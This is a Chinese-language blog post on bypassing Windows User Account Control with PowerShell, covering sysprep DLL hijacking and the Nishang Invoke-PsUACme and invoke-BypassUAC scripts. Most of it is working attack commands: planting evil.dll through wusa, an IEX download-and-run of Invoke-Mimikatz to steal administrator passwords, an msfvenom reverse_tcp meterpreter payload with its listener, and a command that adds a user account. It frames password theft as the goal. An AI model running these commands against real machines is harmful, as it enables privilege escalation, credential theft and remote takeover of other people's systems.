---
title: 使用Powershell Bypass UAC
date: 2015-12-25T08:52:52+08:00
update: 2016-01-01
categories: [网络安全]
tags: [powershell]
---
0x00 简介

UAC(User Account Control，用户帐户控制)是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员‌密码。也就是说一旦用户允许启动的应用程序通过UAC验证，那么这个程序也就有了管理员权限。许多情况下，我们获取了反弹的shell但是由于UAC这个烦人的东西并不能获取最高的权限，今天主要介绍使用powershell来bypass uac从而获取更高的权限。

## 0x01 Bypass UAC
UACME及使用方法

我们选择的用以绕过UAC的工具是[UACME](https://github.com/hfiref0x/UACME)。这个优秀的工具实现了各种方法，并且值得庆幸的是它是开源的，为此感谢@hFirF0XAs。因为我总是尽量在后期利用阶段都使用PowerShell，所以我测试了UACME，并使用PowerShell实现了其中的一些方法。这里我给出Invoke-PsUACme.ps1文件，你可以在Nishang中的“[Escalation](https://github.com/samratashok/nishang/tree/master/Escalation)提权”分类中找到它。

首先，我们以sysprep方法开始，它是绕过UAC最常用的方法，它在2009年由Leo Davidson而出名[详情](http://www.pretentiousname.com/misc/W7E_Source/win7_uac_poc_details.html)。它包括以下步骤：
step1: 复制DLL文件到C:\Windows\System32\sysprep目录，DLL的名字取决于操作系统版本（1）Windows 7上为CRYPTBASE.dll。
（2）Windows 8上为shcore.dll。
step2：从上面的目录执行Sysprep.exe。他将加载上面的DLL，完成权限的提升。
具体dll名及利用exe如下表：
![](http://image.3001.net/images/20151011/14445714412788.jpg)

总结了一下突破Windows UAC的方式主要有以下几种：

1、使用IFileOperation COM接口；
2、使用Wusa.exe的extract选项；
3、远程注入SHELLCODE 到傀儡进程;
4、DLL劫持，劫持系统的DLL文件；
5、直接提权过UAC;
6、MS15-076(感觉上也可以用到) POC。
部分方式需要我们将DLL文件拷贝到相应的目录，这里拿Sysprep来做测试，要往这个目录拷贝文件需要管理员的权限，直接copy是不可以的,本文介绍的脚本使用了第二种方式，下面是一个测试。
使用copy:

`C:\UAC>copy evil.dll C:\Windows\System32\sysprep\`


使用Wusa.exe：

C:\> makecab C:\uac\evil.dll C:\uac\uac.cab
C:\> wusa C:\uac\uac.cab /extract:C:\Windows\System32\sysprep\


可以看到使用wusa成功拷贝。

## 0x02 Invoke-PsUACme

Invoke-PsUACme 是nishang的一个脚本，该脚本使用了列表中的几个方式来进行bypass UAC，目前支持Win7 ，Win8,由于Win10的wusa extract选项不在受支持，所以此脚本并不适用于Win10。
该脚本的所使用的DLL来自于开源项目UACME。nishang作者对代码进行了一下简单地修改，这里就不详细说了。
这里介绍一下脚本的使用,加载脚本：

PS C:\UAC> . .\Invoke-PsUACme.ps1
查看说明：

PS C:\UAC> help Invoke-PsUACme
主要参数说明：Payload为自定义要执行的程序；method为bypass的方式，包括Sysprep，OOBE，ActionQueue等几种；Verbose显示程序运行过程；CustomDLL64,CustomDLL32可以指定自定义DLL。

执行：

PS C:\UAC> Invoke-PsUACme -Verbose


使用Sysprep执行payload:

PS C:\UAC> Invoke-PsUACme -method sysprep -Payload "cmd.exe"


执行某个自定义程序需要在payload出填写绝对路径。

自定义DLL：

PS C:\> Invoke-PSUACMe -CustomDll64 C:\test\test64.dll -CustomDll32 C:\test\test32.dll -Verbose"

## 0x03 能做什么

1）通过bypass UAC我们可以通过普通的cmd抓到管理员密码。
普通cmd运行在线抓明文：

powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz


bypass UAC以后：

PS C:\UAC> . .\Invoke-PsUACme.ps1
PS C:\UAC> Invoke-PsUACme -Payload "powershell -noexit IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"


让meterpreter获得更高的权限。
生成payload:
☁  ~  sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=8889 -f psh-reflection
将输出文件保存为psh.ps1

msf开启监听：

msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost x.x.x.x
lhost => x.x.x.x
msf exploit(handler) > set lport 8889
lport => 8889
msf exploit(handler) > exploit
普通cmd执行:



bypass UAC 以后执行：



## 0x04 Win10 Bypass UAC

我修改了一个使用远程注入方式Bypass UAC的powersell脚本以支持Win10,脚本地址：[戳我](https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/invoke-BypassUAC.ps1)

使用方式与nishang不同，并没有回显，使用win10进行测试：

PS F:\drops\UAC> . .\invoke-BypassUAC.ps1
PS F:\drops\UAC> invoke-BypassUAC -Command 'net user 1 "Password123!" /add'


除了上面的脚本，UACME也很好的支持win10,使用方式为：

akagi32.exe 1
akagi64.exe 3
akagi32 1 c:\windows\system32\calc.exe
akagi64 3 c:\windows\system32\cmd.exe
0x05 小结

绕过UAC能获取更高的权限，你还发愁抓密码么？


http://evi1cg.me/archives/Powershell_Bypass_UAC.html
http://www.freebuf.com/articles/system/81286.html
